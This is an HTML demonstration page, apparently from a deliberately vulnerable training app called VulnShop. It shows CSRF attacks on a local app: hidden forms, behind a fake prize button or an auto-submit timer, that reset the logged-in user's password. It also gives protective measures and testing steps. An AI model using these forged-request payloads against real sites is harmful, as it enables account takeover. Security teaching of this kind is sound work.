<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .warning { background: #ff4444; color: white; padding: 15px; margin-bottom: 20px; }
        .attack-form { background: #f0f0f0; padding: 20px; margin: 20px 0; }
        pre { background: #333; color: #0f0; padding: 15px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="warning">
        <h2>‚ö†Ô∏è CSRF Attack Demonstration</h2>
        <p>This page demonstrates Cross-Site Request Forgery attacks against the VulnShop application.</p>
    </div>

    <h1>Malicious Website</h1>
    <p>Welcome to our "innocent" website! Click the button below to claim your prize!</p>

    <!-- Hidden CSRF Attack Form -->
    <div class="attack-form">
        <h3>üéØ CSRF Attack #1: Password Change</h3>
        <p>This form will change the victim's password if they're logged into VulnShop:</p>
        
        <form id="csrf-form-1" action="http://localhost:5000/change_password" method="post" style="display: none;">
            <input type="hidden" name="new_password" value="hacked123">
            <input type="hidden" name="confirm_password" value="hacked123">
        </form>
        
        <button onclick="document.getElementById('csrf-form-1').submit(); alert('Password change attempt sent!');">
            üéÅ Claim Your Prize!
        </button>
        
        <p><strong>What happens:</strong> If the user is logged into VulnShop, their password gets changed to "hacked123"</p>
    </div>

    <!-- Auto-executing CSRF Attack -->
    <div class="attack-form">
        <h3>üéØ CSRF Attack #2: Auto-executing (Stealth)</h3>
        <p>This form executes automatically when the page loads:</p>
        
        <form id="csrf-form-2" action="http://localhost:5000/change_password" method="post" style="display: none;">
            <input type="hidden" name="new_password" value="stealth_attack">
            <input type="hidden" name="confirm_password" value="stealth_attack">
        </form>
        
        <button onclick="enableAutoAttack()">Enable Auto-Attack (Dangerous!)</button>
        <p id="auto-status">Auto-attack is disabled for safety</p>
    </div>

    <!-- Image-based CSRF Attack -->
    <div class="attack-form">
        <h3>üéØ CSRF Attack #3: Image-based (GET requests)</h3>
        <p>If the application accepted GET requests, this would work:</p>
        <pre>&lt;img src="http://localhost:5000/change_password?new_password=image_attack" style="display:none;"&gt;</pre>
        <p><em>Note: VulnShop uses POST, so this specific attack won't work, but it demonstrates the concept.</em></p>
    </div>

    <h2>üõ°Ô∏è How to Protect Against CSRF</h2>
    <ul>
        <li>Use CSRF tokens in forms</li>
        <li>Verify the Referer header</li>
        <li>Use SameSite cookie attributes</li>
        <li>Require current password for sensitive operations</li>
        <li>Implement proper CORS policies</li>
    </ul>

    <h2>üìö Testing Instructions</h2>
    <ol>
        <li>Open VulnShop in another tab and login</li>
        <li>Return to this page and click the "Claim Your Prize" button</li>
        <li>Check if your VulnShop password was changed</li>
        <li>Try logging in with the new password: "hacked123"</li>
    </ol>

    <script>
        let autoAttackEnabled = false;
        
        function enableAutoAttack() {
            if (confirm('This will automatically attempt a CSRF attack. Continue?')) {
                autoAttackEnabled = true;
                document.getElementById('auto-status').innerHTML = 'Auto-attack enabled! Form will submit in 3 seconds...';
                
                setTimeout(() => {
                    if (autoAttackEnabled) {
                        document.getElementById('csrf-form-2').submit();
                        alert('Stealth CSRF attack executed!');
                    }
                }, 3000);
            }
        }

        // Uncomment the next line to enable automatic attack on page load (very dangerous!)
        // window.onload = () => { setTimeout(() => document.getElementById('csrf-form-1').submit(), 2000); };
    </script>

    <footer style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ccc;">
        <p><strong>Educational Use Only:</strong> This demonstrates security vulnerabilities for learning purposes.</p>
    </footer>
</body>
</html>
